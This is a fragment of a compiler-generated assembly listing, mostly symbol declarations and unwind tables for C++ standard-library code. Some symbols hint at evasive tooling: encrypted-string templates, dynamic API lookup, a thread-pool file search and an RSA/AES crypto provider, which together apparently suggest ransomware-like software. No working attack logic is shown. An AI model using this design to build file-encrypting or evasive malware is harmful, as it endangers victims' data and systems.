PUBLIC	?isDecrypted@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt
PUBLIC	?ThreadpoolHandler@@YAKPEAUthreadpool_info@@@Z	; ThreadpoolHandler
PUBLIC	??$addressof@$$CBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPEBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@@Z ; std::addressof<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > const >
PUBLIC	??$_Pocca@V?$allocator@_W@std@@@std@@YAXAEAV?$allocator@_W@0@AEBV10@@Z ; std::_Pocca<std::allocator<wchar_t> >
PUBLIC	??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> >
PUBLIC	??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>
PUBLIC	??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>
PUBLIC	??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>::operator()
PUBLIC	??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
PUBLIC	??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z		; std::_Unfancy<wchar_t>
PUBLIC	??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z	; std::_Destroy_in_place<wchar_t *>
PUBLIC	??$max@_K@std@@YAAEB_KAEB_K0@Z			; std::max<unsigned __int64>
PUBLIC	??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z	; std::_Deallocate<16,0>
PUBLIC	??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
PUBLIC	??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z ; std::_Construct_in_place<wchar_t *,wchar_t * const &>
PUBLIC	??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z	; std::addressof<wchar_t *>
PUBLIC	??$min@_K@std@@YAAEB_KAEB_K0@Z			; std::min<unsigned __int64>
PUBLIC	??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z ; std::_Allocate_at_least_helper<std::allocator<wchar_t> >
PUBLIC	??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z ; std::_Allocate<16,std::_Default_allocate_traits,0>
PUBLIC	??$_Get_size_of_n@$01@std@@YA_K_K@Z		; std::_Get_size_of_n<2>
PUBLIC	??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>
PUBLIC	__JustMyCode_Default
PUBLIC	??_7exception@std@@6B@				; std::exception::`vftable'
PUBLIC	??_C@_0BC@EOODALEL@Unknown?5exception@		; `string'
PUBLIC	??_7bad_alloc@std@@6B@				; std::bad_alloc::`vftable'
PUBLIC	??_7bad_array_new_length@std@@6B@		; std::bad_array_new_length::`vftable'
PUBLIC	??_C@_0BF@KINCDENJ@bad?5array?5new?5length@	; `string'
PUBLIC	??_R0?AVexception@std@@@8			; std::exception `RTTI Type Descriptor'
PUBLIC	_CT??_R0?AVexception@std@@@8??0exception@std@@QEAA@AEBV01@@Z24
PUBLIC	_TI3?AVbad_array_new_length@std@@
PUBLIC	_CTA3?AVbad_array_new_length@std@@
PUBLIC	??_R0?AVbad_array_new_length@std@@@8		; std::bad_array_new_length `RTTI Type Descriptor'
PUBLIC	_CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QEAA@AEBV01@@Z24
PUBLIC	??_R0?AVbad_alloc@std@@@8			; std::bad_alloc `RTTI Type Descriptor'
PUBLIC	_CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QEAA@AEBV01@@Z24
PUBLIC	??_C@_0BA@JFNIOLAK@string?5too?5long@		; `string'
PUBLIC	??_C@_0DG@DGPPHCJL@Microsoft?5Enhanced?5RSA?5and?5AES?5@ ; `string'
PUBLIC	??_C@_0EC@PDAENLNI@Microsoft?5Enhanced?5RSA?5and?5AES?5@ ; `string'
PUBLIC	??_R4exception@std@@6B@				; std::exception::`RTTI Complete Object Locator'
PUBLIC	??_R3exception@std@@8				; std::exception::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2exception@std@@8				; std::exception::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@exception@std@@8			; std::exception::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4bad_alloc@std@@6B@				; std::bad_alloc::`RTTI Complete Object Locator'
PUBLIC	??_R3bad_alloc@std@@8				; std::bad_alloc::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2bad_alloc@std@@8				; std::bad_alloc::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@bad_alloc@std@@8			; std::bad_alloc::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4bad_array_new_length@std@@6B@		; std::bad_array_new_length::`RTTI Complete Object Locator'
PUBLIC	??_R3bad_array_new_length@std@@8		; std::bad_array_new_length::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2bad_array_new_length@std@@8		; std::bad_array_new_length::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@bad_array_new_length@std@@8	; std::bad_array_new_length::`RTTI Base Class Descriptor at (0,-1,0,64)'
EXTRN	??2@YAPEAX_K@Z:PROC				; operator new
EXTRN	??3@YAXPEAX_K@Z:PROC				; operator delete
EXTRN	_invalid_parameter_noinfo_noreturn:PROC
EXTRN	memcpy:PROC
EXTRN	memmove:PROC
EXTRN	free:PROC
EXTRN	__std_exception_copy:PROC
EXTRN	__std_exception_destroy:PROC
EXTRN	??_Eexception@std@@UEAAPEAXI@Z:PROC		; std::exception::`vector deleting destructor'
EXTRN	??_Ebad_alloc@std@@UEAAPEAXI@Z:PROC		; std::bad_alloc::`vector deleting destructor'
EXTRN	??_Ebad_array_new_length@std@@UEAAPEAXI@Z:PROC	; std::bad_array_new_length::`vector deleting destructor'
EXTRN	?_Xlength_error@std@@YAXPEBD@Z:PROC		; std::_Xlength_error
EXTRN	?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z:PROC	; getapi::GetProcAddressEx2
EXTRN	?m_malloc@@YAPEAX_K@Z:PROC			; m_malloc
EXTRN	?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z:PROC ; filesystem::SearchFiles
EXTRN	_CxxThrowException:PROC
EXTRN	_RTC_CheckStackVars:PROC
EXTRN	_RTC_InitBase:PROC
EXTRN	_RTC_Shutdown:PROC
EXTRN	__CheckForDebuggerJustMyCode:PROC
EXTRN	__GSHandlerCheck:PROC
EXTRN	__security_check_cookie:PROC
EXTRN	??_7type_info@@6B@:BYTE				; type_info::`vftable'
EXTRN	__security_cookie:QWORD
;	COMDAT pdata
pdata	SEGMENT
$pdata$RtlSecureZeroMemory DD imagerel $LN3
	DD	imagerel $LN3+79
	DD	imagerel $unwind$RtlSecureZeroMemory
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??2@YAPEAX_KPEAX@Z DD imagerel $LN3
	DD	imagerel $LN3+53
	DD	imagerel $unwind$??2@YAPEAX_KPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?max@?$numeric_limits@_J@std@@SA_JXZ DD imagerel $LN3
	DD	imagerel $LN3+47
	DD	imagerel $unwind$?max@?$numeric_limits@_J@std@@SA_JXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0exception@std@@QEAA@QEBDH@Z DD imagerel $LN3
	DD	imagerel $LN3+116
	DD	imagerel $unwind$??0exception@std@@QEAA@QEBDH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0exception@std@@QEAA@AEBV01@@Z DD imagerel $LN3
	DD	imagerel $LN3+123
	DD	imagerel $unwind$??0exception@std@@QEAA@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1exception@std@@UEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+77
	DD	imagerel $unwind$??1exception@std@@UEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?what@exception@std@@UEBAPEBDXZ DD imagerel $LN5
	DD	imagerel $LN5+96
	DD	imagerel $unwind$?what@exception@std@@UEBAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_Gexception@std@@UEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+82
	DD	imagerel $unwind$??_Gexception@std@@UEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0bad_alloc@std@@AEAA@QEBD@Z DD imagerel $LN3
	DD	imagerel $LN3+95
	DD	imagerel $unwind$??0bad_alloc@std@@AEAA@QEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1bad_alloc@std@@UEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$??1bad_alloc@std@@UEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0bad_alloc@std@@QEAA@AEBV01@@Z DD imagerel $LN3
	DD	imagerel $LN3+77
	DD	imagerel $unwind$??0bad_alloc@std@@QEAA@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_Gbad_alloc@std@@UEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+82
	DD	imagerel $unwind$??_Gbad_alloc@std@@UEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0bad_array_new_length@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+84
	DD	imagerel $unwind$??0bad_array_new_length@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1bad_array_new_length@std@@UEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$??1bad_array_new_length@std@@UEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0bad_array_new_length@std@@QEAA@AEBV01@@Z DD imagerel $LN3
	DD	imagerel $LN3+77
	DD	imagerel $unwind$??0bad_array_new_length@std@@QEAA@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_Gbad_array_new_length@std@@UEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+82
	DD	imagerel $unwind$??_Gbad_array_new_length@std@@UEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Throw_bad_array_new_length@std@@YAXXZ DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?_Throw_bad_array_new_length@std@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z DD imagerel $LN3
	DD	imagerel $LN3+53
	DD	imagerel $unwind$?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z DD imagerel $LN11
	DD	imagerel $LN11+181
	DD	imagerel $unwind$?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Orphan_all@_Container_base0@std@@QEAAXXZ DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$?_Orphan_all@_Container_base0@std@@QEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z DD imagerel $LN3
	DD	imagerel $LN3+46
	DD	imagerel $unwind$?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z DD imagerel $LN3
	DD	imagerel $LN3+58
	DD	imagerel $unwind$??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z DD imagerel $LN3
	DD	imagerel $LN3+90
	DD	imagerel $unwind$?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z DD imagerel $LN3
	DD	imagerel $LN3+90
	DD	imagerel $unwind$?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z DD imagerel $LN3
	DD	imagerel $LN3+66
	DD	imagerel $unwind$?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Xlen_string@std@@YAXXZ DD imagerel $LN3
	DD	imagerel $LN3+49
	DD	imagerel $unwind$?_Xlen_string@std@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$allocator@_W@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$??0?$allocator@_W@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z DD imagerel $LN3
	DD	imagerel $LN3+76
	DD	imagerel $unwind$?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z DD imagerel $LN3
	DD	imagerel $LN3+66
	DD	imagerel $unwind$?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z DD imagerel $LN3
	DD	imagerel $LN3+53
	DD	imagerel $unwind$?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+93
	DD	imagerel $unwind$??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ DD imagerel $LN4
	DD	imagerel $LN4+94
	DD	imagerel $unwind$?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ DD imagerel $LN4
	DD	imagerel $LN4+94
	DD	imagerel $unwind$?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ DD imagerel $LN5
	DD	imagerel $LN5+84
	DD	imagerel $unwind$?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+71
	DD	imagerel $unwind$??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ DD imagerel $LN3
	DD	imagerel $LN3+56
	DD	imagerel $unwind$?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+44
	DD	imagerel $unwind$??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+82
	DD	imagerel $unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z DD imagerel $LN3
	DD	imagerel $LN3+143
	DD	imagerel $unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z DD imagerel $LN3
	DD	imagerel $LN3+83
	DD	imagerel $unwind$?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ DD imagerel $LN3
	DD	imagerel $LN3+144
	DD	imagerel $unwind$?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z DD imagerel $LN4
	DD	imagerel $LN4+169
	DD	imagerel $unwind$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z DD imagerel $LN4
	DD	imagerel $LN4+232
	DD	imagerel $unwind$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ DD imagerel $LN3
	DD	imagerel $LN3+226
	DD	imagerel $unwind$?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z DD imagerel $LN5
	DD	imagerel $LN5+271
	DD	imagerel $unwind$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z DD imagerel $LN3
	DD	imagerel $LN3+84
	DD	imagerel $unwind$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ DD imagerel $LN4
	DD	imagerel $LN4+196
	DD	imagerel $unwind$?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+56
	DD	imagerel $unwind$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+56
	DD	imagerel $unwind$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
